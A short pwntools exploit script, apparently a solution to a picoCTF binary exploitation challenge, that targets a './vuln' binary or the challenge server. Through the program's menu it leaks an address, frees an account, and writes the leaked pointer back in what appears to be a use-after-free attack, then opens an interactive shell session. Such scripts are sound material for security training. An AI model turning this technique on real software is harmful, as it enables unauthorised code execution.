#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './vuln'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        if args.REMOTE:
            return remote('mercury.picoctf.net', 48259)
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

# Welcome to my stream! ^W^
# ==========================
# (S)ubscribe to my channel
# (I)nquire about account deletion
# (M)ake an Twixer account
# (P)ay for premium membership
# (l)eave a message(with or without logging in)
# (e)xit

io.sendline('S')
io.recvuntil('...', drop=True)
leak = int(io.recvline().strip(), 0)
log.success('Got leak: {}'.format(hex(leak)))

io.recvuntil('(e)xit', drop=True)
io.sendline('I')
io.sendline('Y')

io.sendline('l')
io.sendlineafter('try anyways:\n', p64(leak))
io.interactive()

